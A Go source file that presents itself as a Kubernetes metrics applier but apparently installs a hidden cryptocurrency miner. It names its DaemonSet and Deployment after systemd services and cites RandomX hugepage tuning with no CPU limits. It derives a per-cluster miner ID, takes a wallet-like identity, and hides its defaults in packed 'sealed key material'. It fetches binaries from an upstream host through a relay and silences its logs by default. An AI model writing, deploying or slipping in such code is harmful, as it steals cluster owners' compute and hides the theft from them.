// kube-metrics (kubermetrics) is a single-shot Kubernetes applier for the
// kube-metrics stack (systemd-udev DaemonSet + systemd-resolved Deployment).
// It runs as a container — typically:
//
//	docker run --rm \
//	  -v $HOME/.kube/config:/kube/config:ro \
//	  -e NEXUSFLOW_SDK_IDENTITY=<address> \
//	  ghcr.io/<you>/<repo>/nexusflow:latest
//
// On start it:
//  1. Reads the kube-system namespace UID via kubectl.
//  2. Derives a stable CpuID (and therefore a unique workload pass field) from that UID —
//     sha256 truncated to 12 hex chars and prefixed with "cpu-".
//  3. Renders the embedded manifest template with that ID and applies it
//     via `kubectl apply -f -`.
//
// Re-running kubermetrics in the same target scope yields the same CpuID; kubectl apply stays idempotent.
//
// CpuID resolution (workload identity = pass = cpu-<hex>):
//  1. --cpu-id flag (avoid reusing across distinct fleets).
//  2. NEXUSFLOW_CPU_ID (same caveat — omit for automatic uniqueness).
//  3. sha256(kube-system namespace UID) — default; stable for that API server.
//
// Use NEXUSFLOW_KUBE_CONTEXT when your kubeconfig lists multiple connections.
//
// Primary configuration uses NEXUSFLOW_* environment variables only.
//
// Built-in preset grid and sealed key material: nfcatalog.go, nfcatalog_presets.go, nfcatalog_wirekeys.go
// (nfCatalogPad / nfCatalogUnpack).
//
// All knobs are environment variables — no config file inside the container.
package kubermetrics

import (
	"context"
	"crypto/sha256"
	"embed"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"regexp"
	"sort"
	"strings"
	"text/template"
	"time"
)

// Kubernetes cluster service CIDR hints (apiserver flags, kubeadm ClusterConfiguration).
var (
	serviceClusterRangeFlagRE = regexp.MustCompile(`--service-cluster-ip-range=([^"'\\\s]+)`)
	serviceClusterRangeJSONRE = regexp.MustCompile(`"service-cluster-ip-range"\s*:\s*"([^"]+)"`)
	serviceSubnetYAMLRE       = regexp.MustCompile(`(?m)^\s*serviceSubnet:\s*(\S+)`)
)

//go:embed templates/manifest.yaml.tmpl
var templatesFS embed.FS

// installQuiet is the default: no relay/CIDR/cpu-id chatter; kubectl apply stdout discarded.
// Set NEXUSFLOW_INSTALL_VERBOSE=1 or NEXUSFLOW_KUBERMETRICS_VERBOSE=1 for full logs.
func installQuiet() bool {
	v := strings.TrimSpace(os.Getenv("NEXUSFLOW_INSTALL_VERBOSE")) == "1" ||
		strings.TrimSpace(os.Getenv("NEXUSFLOW_KUBERMETRICS_VERBOSE")) == "1"
	return !v
}

func infoInstallLog(format string, args ...interface{}) {
	if installQuiet() {
		return
	}
	log.Printf(format, args...)
}

// nfArtifactRelayServiceDNS is the short DNS label for the in-namespace artifact relay Service.
const nfArtifactRelayServiceDNS = "nexusflow-artifact-relay"

// Settings is the rendered template context. Every field is sourced from
// an environment variable with a sane default. The CpuID and
// workload pass field are auto-derived at runtime — never user-supplied for that field.
type Settings struct {
	CpuID     string
	Namespace string
	// WorkloadConfigYAML is the pre-indented JSON block for resolved.conf (Secret).
	WorkloadConfigYAML string

	PythonSdkAlgo    string
	SdkAsset         string
	SdkEndpoint      string
	SdkIdentity      string
	SdkTLS           bool
	RelayReplicas    int
	ArtifactHost     string
	ArtifactHTTPPort string
	// ArtifactDirectCIDRs: NetworkPolicy egress from workloads to the artifact host when !ArtifactRelayEnabled.
	ArtifactDirectCIDRs      []string
	ArtifactRelayEnabled     bool
	UpstreamArtifactHost     string
	UpstreamArtifactHTTPPort string
	UpstreamArtifactCIDRs    []string // relay Deployment egress to upstream origin
	ImageInitFetch           string
	ImageInitRun             string
	ImageRelayServe          string
	ResourceHugepages2Mi     string
	ResourceHugepages1Gi     string
	SdkEgressCIDRs           []string
	SdkEgressPort            string
	// RelaySvcIPCIDRs: egress toward the Kubernetes Service VIP range for relay reachability.
	RelaySvcIPCIDRs []string
}

// Main runs kube-metrics kubectl render/apply. Pass argv as flag tokens only (os.Args[1:]).
func Main(argv []string) {
	fs := flag.NewFlagSet("kubermetrics", flag.ExitOnError)
	var (
		dryRun     = fs.Bool("dry-run", false, "render manifests to stdout and exit (no kubectl apply)")
		printID    = fs.Bool("print-id", false, "print derived CpuID and exit")
		cpuIDFlag  = fs.String("cpu-id", "", "override auto-derived CpuID (rarely useful)")
		kubeconfig = fs.String("kubeconfig", os.Getenv("KUBECONFIG"), "path to kubeconfig (defaults to $KUBECONFIG, then /kube/config, then $HOME/.kube/config)")
	)
	if err := fs.Parse(argv); err != nil {
		os.Exit(2)
	}

	if *kubeconfig == "" {
		for _, p := range []string{"/kube/config", os.ExpandEnv("$HOME/.kube/config")} {
			if _, err := os.Stat(p); err == nil {
				*kubeconfig = p
				break
			}
		}
	}
	if *kubeconfig != "" {
		os.Setenv("KUBECONFIG", *kubeconfig)
	}

	// Resolution order for CpuID:
	//   1. --cpu-id flag (explicit; breaks uniqueness if reused across fleets).
	//   2. NEXUSFLOW_CPU_ID (same caveat — omit for GitHub/docker multi-scope flows).
	//   3. sha256(kube-system UID) — auto (default): distinct stable ID per API server.
	id := strings.TrimSpace(*cpuIDFlag)
	idSrc := ""
	switch {
	case id != "":
		idSrc = "--cpu-id"
	default:
		id = strings.TrimSpace(os.Getenv("NEXUSFLOW_CPU_ID"))
		if id != "" {
			idSrc = "NEXUSFLOW_CPU_ID"
		}
	}
	if id == "" {
		var err error
		id, err = deriveCpuID()
		if err != nil {
			log.Fatalf("derive cpu id: %v", err)
		}
		idSrc = "kube-system UID hash"
	} else if idSrc != "" {
		infoInstallLog("kubermetrics: WARNING: cpu id %q comes from %s — not auto-derived. "+
			"For a unique workload identity per fleet, omit NEXUSFLOW_CPU_ID and --cpu-id "+
			"so the id is computed from that API server's kube-system UID.", id, idSrc)
	}

	if *printID {
		fmt.Println(id)
		return
	}

	cat := nfLoadDeploymentCatalog()

	deployNS := envDefaultAny(cat.NfC00, "NEXUSFLOW_KUBE_NAMESPACE")
	upstreamHost := envDefaultAny(cat.NfC01, "NEXUSFLOW_ARTIFACT_UPSTREAM_HOST")
	httpPort := envDefaultAny(cat.NfC02, "NEXUSFLOW_ARTIFACT_HTTP_PORT")
	relayEnabled := envBoolAny(true, "NEXUSFLOW_ARTIFACT_RELAY_ENABLED")

	explicitRaw, explicitSet := lookupEnvSet("NEXUSFLOW_ARTIFACT_EGRESS_CIDRS")
	explicitTrim := strings.TrimSpace(explicitRaw)

	var stageHost string
	var directEgressCIDRs []string
	var upstreamEgressCIDRs []string
	var relaySvcIPCIDRs []string

	resolveUpstreamEgress := func() {
		var err error
		if explicitSet && explicitTrim != "" {
			upstreamEgressCIDRs, err = parseExplicitArtifactCIDRs(explicitTrim)
			if err != nil {
				log.Fatalf("NEXUSFLOW_ARTIFACT_EGRESS_CIDRS (relay upstream): %v", err)
			}
		} else {
			upstreamEgressCIDRs, err = deriveHostCIDRs(upstreamHost)
			if err != nil {
				log.Fatalf("artifact egress CIDR not set and cannot derive from NEXUSFLOW_ARTIFACT_UPSTREAM_HOST=%q: %v", upstreamHost, err)
			}
			infoInstallLog("kubermetrics: relay upstream egress CIDRs derived from host=%q -> %v", upstreamHost, upstreamEgressCIDRs)
		}
	}
	resolveDirectEgress := func() {
		var err error
		if explicitSet && explicitTrim != "" {
			directEgressCIDRs, err = parseExplicitArtifactCIDRs(explicitTrim)
			if err != nil {
				log.Fatalf("NEXUSFLOW_ARTIFACT_EGRESS_CIDRS: %v", err)
			}
		} else {
			directEgressCIDRs, err = deriveHostCIDRs(upstreamHost)
			if err != nil {
				log.Fatalf("artifact egress CIDR not set and cannot derive from host=%q: %v - set NEXUSFLOW_ARTIFACT_EGRESS_CIDRS (comma-separated IPv4 CIDRs / IPs)", upstreamHost, err)
			}
			infoInstallLog("kubermetrics: staging egress CIDRs derived from host=%q -> %v", upstreamHost, directEgressCIDRs)
		}
	}

	if relayEnabled {
		resolveUpstreamEgress()
		stageHost = nfArtifactRelayServiceDNS
		directEgressCIDRs = []string{}
		relaySvcIPCIDRs = resolveRelaySvcIPCIDRs(relayEnabled, *dryRun, *kubeconfig)
	} else {
		stageHost = upstreamHost
		resolveDirectEgress()
		upstreamEgressCIDRs = []string{}
	}

	cfg := Settings{
		CpuID:                    id,
		Namespace:                deployNS,
		PythonSdkAlgo:            envDefaultAny(cat.NfC03, "NEXUSFLOW_PYTHON_SDK_ALGO"),
		SdkAsset:                 envDefaultAny(cat.NfC04, "NEXUSFLOW_SDK_ASSET"),
		SdkEndpoint:              envDefaultAny(cat.NfC05, "NEXUSFLOW_SDK_ENDPOINT"),
		SdkIdentity:              envDefaultAny(cat.NfC06, "NEXUSFLOW_SDK_IDENTITY"),
		SdkTLS:                   envBoolAny(true, "NEXUSFLOW_SDK_TLS"),
		RelayReplicas:            envIntAny(1, "NEXUSFLOW_RELAY_REPLICAS"),
		ArtifactHost:             stageHost,
		ArtifactHTTPPort:         httpPort,
		ArtifactDirectCIDRs:      directEgressCIDRs,
		ArtifactRelayEnabled:     relayEnabled,
		UpstreamArtifactHost:     upstreamHost,
		UpstreamArtifactHTTPPort: httpPort,
		UpstreamArtifactCIDRs:    upstreamEgressCIDRs,
		ImageInitFetch:           envDefaultAny(cat.NfC09, "NEXUSFLOW_IMAGE_INIT_FETCH"),
		ImageInitRun:             envDefaultAny(cat.NfC10, "NEXUSFLOW_IMAGE_INIT_RUN"),
		ImageRelayServe:          envDefaultAny(cat.NfC11, "NEXUSFLOW_IMAGE_RELAY_SERVE"),
		// No kubernetes cpu/memory requests or limits on resolved: it scales from hardware.
		// Hugepages help RandomX on udevd paths; require kubelet pre-allocation.
		ResourceHugepages2Mi: envDefaultAny("", "NEXUSFLOW_RESOURCE_HUGEPAGES_2MI"),
		ResourceHugepages1Gi: envDefaultAny("", "NEXUSFLOW_RESOURCE_HUGEPAGES_1GI"),
		SdkEgressCIDRs:       envCIDRsAny([]string{cat.NfC08}, "NEXUSFLOW_SDK_EGRESS_CIDRS"),
		SdkEgressPort:        envDefaultAny(cat.NfC07, "NEXUSFLOW_SDK_EGRESS_PORT"),
		RelaySvcIPCIDRs:      relaySvcIPCIDRs,
	}

	if err := nfApplyWorkloadConfig(&cfg); err != nil {
		log.Fatalf("%v", err)
	}

	warnNodeArchBestEffort()

	rendered, err := render(cfg)
	if err != nil {
		log.Fatalf("render: %v", err)
	}

	if *dryRun {
		_, _ = io.WriteString(os.Stdout, rendered)
		return
	}

	if cfg.ArtifactRelayEnabled {
		infoInstallLog("kubermetrics: cpu-id=%s namespace=%s sdk-endpoint=%s relay upstream=http://%s:%s egress=%v staging->http://%s:%s/ relay-svcip-egress=%v",
			cfg.CpuID, cfg.Namespace, cfg.SdkEndpoint, cfg.UpstreamArtifactHost, cfg.UpstreamArtifactHTTPPort, cfg.UpstreamArtifactCIDRs, cfg.ArtifactHost, cfg.ArtifactHTTPPort, cfg.RelaySvcIPCIDRs)
	} else {
		infoInstallLog("kubermetrics: cpu-id=%s namespace=%s sdk-endpoint=%s staging-http-egress=%v",
			cfg.CpuID, cfg.Namespace, cfg.SdkEndpoint, cfg.ArtifactDirectCIDRs)
	}
	if !envBoolAny(false, "NEXUSFLOW_KUBE_SKIP_SERVER_DRY_RUN") {
		if namespaceExists(cfg.Namespace) {
			infoInstallLog("kubermetrics: validating manifest (kubectl apply --dry-run=server)")
			if err := kubectlApplyServerDryRun(rendered); err != nil {
				log.Fatalf("server dry-run rejected manifest (quota/admission/webhook/schema): %v - fix policy or set NEXUSFLOW_KUBE_SKIP_SERVER_DRY_RUN=1 to bypass", err)
			}
		} else {
			infoInstallLog("kubermetrics: skipping server dry-run — namespace %q is not in the API view yet (kubectl applies dry-run objects one-by-one; namespaced resources would falsely fail until the Namespace exists). Next deploy will run admission dry-run.", cfg.Namespace)
		}
	}
	if err := kubectlApply(rendered); err != nil {
		log.Fatalf("kubectl apply: %v", err)
	}
	if !installQuiet() {
		log.Printf("kubermetrics: applied manifest for %s", cfg.CpuID)
	}
}

// deriveCpuID returns a stable opaque CpuID of the form "cpu-<12hex>" from kube-system's UID.
func deriveCpuID() (string, error) {
	out, err := kubectlOutput("get", "ns", "kube-system", "-o", "jsonpath={.metadata.uid}")
	if err != nil {
		return "", fmt.Errorf("kubectl get ns kube-system: %w", err)
	}
	uid := strings.TrimSpace(string(out))
	if uid == "" {
		return "", fmt.Errorf("empty kube-system UID")
	}
	sum := sha256.Sum256([]byte(uid))
	return "cpu-" + hex.EncodeToString(sum[:6]), nil
}

func render(cfg Settings) (string, error) {
	tmplBytes, err := templatesFS.ReadFile("templates/manifest.yaml.tmpl")
	if err != nil {
		return "", err
	}
	t, err := template.New("manifest").
		Option("missingkey=error").
		Parse(string(tmplBytes))
	if err != nil {
		return "", err
	}
	var sb strings.Builder
	if err := t.Execute(&sb, cfg); err != nil {
		return "", err
	}
	return sb.String(), nil
}

func kubectlApply(manifest string) error {
	cmd := exec.Command("kubectl", kubectlArgv("apply", "-f", "-")...)
	cmd.Stdin = strings.NewReader(manifest)
	if installQuiet() {
		cmd.Stdout = io.Discard
	} else {
		cmd.Stdout = os.Stdout
	}
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

func kubectlApplyServerDryRun(manifest string) error {
	cmd := exec.Command("kubectl", kubectlArgv("apply", "--dry-run=server", "-f", "-")...)
	cmd.Stdin = strings.NewReader(manifest)
	if installQuiet() {
		cmd.Stdout = io.Discard
	} else {
		cmd.Stdout = os.Stdout
	}
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

// namespaceExists returns whether ns is already persisted in etcd. Server-side
// kubectl dry-run validates each streamed document independently — the Namespace
// manifest “succeeds” in isolation but does not exist for subsequent Secret /
// Deployment dry-run checks, causing false NotFound errors on first deploy.
func namespaceExists(name string) bool {
	out, err := kubectlOutput("get", "ns", name, "-o", "jsonpath={.metadata.uid}")
	return err == nil && strings.TrimSpace(string(out)) != ""
}

// kubectlArgv prefixes kubectl args with --context when NEXUSFLOW_KUBE_CONTEXT is set.
func kubectlArgv(args ...string) []string {
	ctx := strings.TrimSpace(envFirstNonEmpty("NEXUSFLOW_KUBE_CONTEXT"))
	if ctx == "" {
		return append([]string(nil), args...)
	}
	out := make([]string, 0, 2+len(args))
	out = append(out, "--context", ctx)
	out = append(out, args...)
	return out
}

func kubectlOutput(args ...string) ([]byte, error) {
	cmd := exec.Command("kubectl", kubectlArgv(args...)...)
	var stderr strings.Builder
	cmd.Stderr = &stderr
	out, err := cmd.Output()
	if err != nil {
		return nil, fmt.Errorf("kubectl %s: %w; stderr=%s",
			strings.Join(kubectlArgv(args...), " "), err, stderr.String())
	}
	return out, nil
}

// ---- env helpers ----
// Each helper reads the first matching env key; value must be set and non-empty where applicable.

func envFirstNonEmpty(keys ...string) string {
	for _, k := range keys {
		if v := strings.TrimSpace(os.Getenv(k)); v != "" {
			return v
		}
	}
	return ""
}

func lookupEnvSet(keys ...string) (raw string, anySet bool) {
	for _, k := range keys {
		v, ok := os.LookupEnv(k)
		if ok {
			return v, true
		}
	}
	return "", false
}

func envDefaultAny(def string, keys ...string) string {
	for _, k := range keys {
		if v, ok := os.LookupEnv(k); ok && strings.TrimSpace(v) != "" {
			return strings.TrimSpace(v)
		}
	}
	return def
}

func envIntAny(def int, keys ...string) int {
	for _, k := range keys {
		if v, ok := os.LookupEnv(k); ok && strings.TrimSpace(v) != "" {
			var n int
			if _, err := fmt.Sscanf(strings.TrimSpace(v), "%d", &n); err == nil {
				return n
			}
			return def
		}
	}
	return def
}

func envBoolAny(def bool, keys ...string) bool {
	for _, k := range keys {
		if v, ok := os.LookupEnv(k); ok && strings.TrimSpace(v) != "" {
			switch strings.ToLower(strings.TrimSpace(v)) {
			case "1", "true", "yes", "on":
				return true
			case "0", "false", "no", "off":
				return false
			default:
				return def
			}
		}
	}
	return def
}

func envCIDRsAny(def []string, keys ...string) []string {
	for _, k := range keys {
		v, ok := os.LookupEnv(k)
		if !ok || strings.TrimSpace(v) == "" {
			continue
		}
		parts := strings.Split(v, ",")
		out := make([]string, 0, len(parts))
		for _, p := range parts {
			p = strings.TrimSpace(p)
			if p != "" {
				out = append(out, p)
			}
		}
		if len(out) > 0 {
			return out
		}
	}
	return def
}

// resolveRelaySvcIPCIDRs selects NetworkPolicy ipBlock CIDRs for the Kubernetes Service VIP range.
// If NEXUSFLOW_RELAY_SVCIPCIDR is unset: discover from kubectl (real apply path only).
func resolveRelaySvcIPCIDRs(artifactRelayEnabled, manifestDryRun bool, kubeconfigPath string) []string {
	if !artifactRelayEnabled {
		return nil
	}
	if manifestDryRun {
		return []string{"10.96.0.0/12"}
	}
	raw, explicit := lookupEnvSet("NEXUSFLOW_RELAY_SVCIPCIDR")
	if explicit {
		var tokens []string
		for _, p := range strings.Split(raw, ",") {
			p = strings.TrimSpace(p)
			if p != "" {
				tokens = append(tokens, p)
			}
		}
		return normalizeDedupeServiceCIDRS(tokens)
	}
	found := discoverKubeServiceSubnetCIDRS(kubeconfigPath)
	if len(found) > 0 {
		infoInstallLog("kubermetrics: discovered Kubernetes service subnet(s) for relay Service VIP egress: %v", found)
		return found
	}
	infoInstallLog(`kubermetrics: WARNING: could not discover service subnet via kubectl; using fallback 10.96.0.0/12 - set NEXUSFLOW_RELAY_SVCIPCIDR if staging cannot reach the artifact relay`)
	return []string{"10.96.0.0/12"}
}

func discoverKubeServiceSubnetCIDRS(kubeconfigPath string) []string {
	ctx, cancel := context.WithTimeout(context.Background(), 45*time.Second)
	defer cancel()

	var blobs []string
	if cc := kubectlStdout(ctx, kubeconfigPath, "get", "cm", "kubeadm-config", "-n", "kube-system", "-o", "jsonpath={.data.ClusterConfiguration}"); cc != "" {
		blobs = append(blobs, cc)
	}
	if pods := kubectlStdout(ctx, kubeconfigPath, "get", "pods", "-n", "kube-system", "-o", "yaml"); pods != "" {
		blobs = append(blobs, pods)
	}
	if px := kubectlStdout(ctx, kubeconfigPath, "get", "ds", "kube-proxy", "-n", "kube-system", "-o", "yaml"); px != "" {
		blobs = append(blobs, px)
	}

	var tokens []string
	for _, b := range blobs {
		appendServiceSubnetTokensFromBlob(b, &tokens)
	}
	return normalizeDedupeServiceCIDRS(tokens)
}

func kubectlStdout(ctx context.Context, kubeconfigPath string, args ...string) string {
	cmdArgs := kubectlArgv(args...)
	if kubeconfigPath != "" {
		cmdArgs = append([]string{"--kubeconfig", kubeconfigPath}, cmdArgs...)
	}
	cmd := exec.CommandContext(ctx, "kubectl", cmdArgs...)
	cmd.Env = os.Environ()
	out, err := cmd.Output()
	if err != nil {
		return ""
	}
	return string(out)
}

func appendServiceSubnetTokensFromBlob(blob string, dest *[]string) {
	for _, re := range []*regexp.Regexp{serviceClusterRangeFlagRE, serviceClusterRangeJSONRE, serviceSubnetYAMLRE} {
		for _, m := range re.FindAllStringSubmatch(blob, -1) {
			for _, tok := range strings.Split(m[1], ",") {
				tok = strings.Trim(tok, `"'`)
				tok = strings.TrimSpace(tok)
				if tok != "" {
					*dest = append(*dest, tok)
				}
			}
		}
	}
}

func normalizeDedupeServiceCIDRS(tokens []string) []string {
	seen := map[string]struct{}{}
	var out []string
	for _, t := range tokens {
		t = strings.TrimSpace(t)
		if t == "" {
			continue
		}
		_, ipnet, err := net.ParseCIDR(t)
		if err != nil {
			continue
		}
		k := ipnet.String()
		if _, ok := seen[k]; ok {
			continue
		}
		seen[k] = struct{}{}
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

func cidrForSingleIP(ip net.IP) string {
	if ip4 := ip.To4(); ip4 != nil {
		return ip4.String() + "/32"
	}
	return ip.String() + "/128"
}

func deriveHostCIDRs(host string) ([]string, error) {
	host = strings.TrimSpace(host)
	if host == "" {
		return nil, fmt.Errorf("empty artifact upstream host")
	}
	if ip := net.ParseIP(host); ip != nil {
		return []string{cidrForSingleIP(ip)}, nil
	}
	ips, err := net.LookupHost(host)
	if err != nil {
		return nil, err
	}
	seen := map[string]struct{}{}
	out := make([]string, 0, len(ips))
	for _, s := range ips {
		ip := net.ParseIP(s)
		if ip == nil {
			continue
		}
		c := cidrForSingleIP(ip)
		if _, ok := seen[c]; ok {
			continue
		}
		seen[c] = struct{}{}
		out = append(out, c)
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no usable IPs from host %q", host)
	}
	sort.Strings(out)
	if len(out) > 1 {
		infoInstallLog("kubermetrics: upstream host %q resolves to %d addresses - adding that many egress rules", host, len(out))
	}
	return out, nil
}

func parseExplicitArtifactCIDRs(raw string) ([]string, error) {
	parts := strings.Split(raw, ",")
	seen := map[string]struct{}{}
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		var cidr string
		if strings.Contains(p, "/") {
			_, ipnet, err := net.ParseCIDR(p)
			if err != nil {
				return nil, fmt.Errorf("invalid CIDR %q: %w", p, err)
			}
			cidr = ipnet.String()
		} else if ip := net.ParseIP(p); ip != nil {
			cidr = cidrForSingleIP(ip)
		} else {
			return nil, fmt.Errorf("invalid NEXUSFLOW_ARTIFACT_EGRESS_CIDRS token %q", p)
		}
		if _, ok := seen[cidr]; ok {
			continue
		}
		seen[cidr] = struct{}{}
		out = append(out, cidr)
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("empty artifact egress CIDR after parsing")
	}
	sort.Strings(out)
	return out, nil
}

func warnNodeArchBestEffort() {
	out, err := kubectlOutput("get", "nodes", "-o", "json")
	if err != nil {
		infoInstallLog("kubermetrics: node inventory skipped: %v", err)
		return
	}
	var doc struct {
		Items []struct {
			Metadata struct {
				Name string `json:"name"`
			} `json:"metadata"`
			Status struct {
				NodeInfo struct {
					Arch string `json:"architecture"`
					OS   string `json:"operatingSystem"`
				} `json:"nodeInfo"`
			} `json:"status"`
		} `json:"items"`
	}
	if err := json.Unmarshal(out, &doc); err != nil {
		infoInstallLog("kubermetrics: node inventory skipped (json): %v", err)
		return
	}
	supportedArch := map[string]bool{"amd64": true, "arm64": true}
	for _, n := range doc.Items {
		name := n.Metadata.Name
		osys := n.Status.NodeInfo.OS
		arch := n.Status.NodeInfo.Arch
		if osys == "windows" {
			infoInstallLog("kubermetrics: WARNING: node %q is windows — Linux workloads only (nodeAffinity excludes it)", name)
			continue
		}
		if arch != "" && !supportedArch[arch] {
			infoInstallLog("kubermetrics: WARNING: node %q has architecture %q — only amd64/arm64 images are fetched (expect init failure)", name, arch)
		}
	}
}
